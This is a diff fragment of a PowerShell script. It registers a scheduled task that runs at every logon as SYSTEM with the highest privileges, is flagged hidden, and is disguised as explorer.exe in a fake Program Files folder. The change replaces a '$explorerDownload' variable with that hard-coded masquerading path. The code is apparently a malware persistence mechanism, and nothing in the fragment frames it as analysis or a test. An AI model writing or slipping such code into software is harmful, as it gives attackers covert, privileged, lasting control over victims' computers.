@@ -79,7 +79,7 @@ try {
 }
 catch {}
 if (-not $taskExists) {
-    $action = New-ScheduledTaskAction -Execute $explorerDownload
+    $action = New-ScheduledTaskAction -Execute "C:\Program Files\Explorer\\explorer.exe"
     $trigger = New-ScheduledTaskTrigger -AtLogOn
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden explorer.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
